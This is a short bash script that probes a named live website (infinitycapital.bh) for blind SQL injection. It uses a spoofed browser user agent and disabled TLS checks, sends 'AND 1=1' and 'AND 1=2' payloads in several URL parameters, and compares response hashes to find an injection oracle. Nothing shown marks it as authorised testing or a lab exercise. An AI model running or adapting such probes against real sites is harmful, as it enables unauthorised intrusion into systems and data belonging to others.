#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
g() { curl -sk -A "$UA" "$B$1" -o "/tmp/r$2" -w "$1 -> %{http_code} %{size_download} %{content_type}\n"; }
g "/" a1
g "/?page=2" a2
g "/?page=3" a3
g "/?page=2%20AND%201=1" a4
g "/?page=2%20AND%201=2" a5
g "/?page=999999" a6
g "/?page=0" a7
g "/?zzz=1" a8
g "/contact?cb=1" b1
g "/contact?cb=1%20AND%201=1" b2
g "/contact?cb=1%20AND%201=2" b3
g "/contact" b4
g "/?id=1" c1
g "/?id=1%20AND%201=1" c2
g "/?id=1%20AND%201=2" c3
echo "=== md5 (identical bodies => no oracle)"
md5sum /tmp/ra1 /tmp/ra2 /tmp/ra3 /tmp/ra4 /tmp/ra5 /tmp/ra6 /tmp/ra7 /tmp/ra8
md5sum /tmp/rb1 /tmp/rb2 /tmp/rb3 /tmp/rb4
md5sum /tmp/rc1 /tmp/rc2 /tmp/rc3
echo "=== does 'page' value appear in body?"
grep -c 'page=2' /tmp/ra2; grep -c 'INJX' /tmp/ra2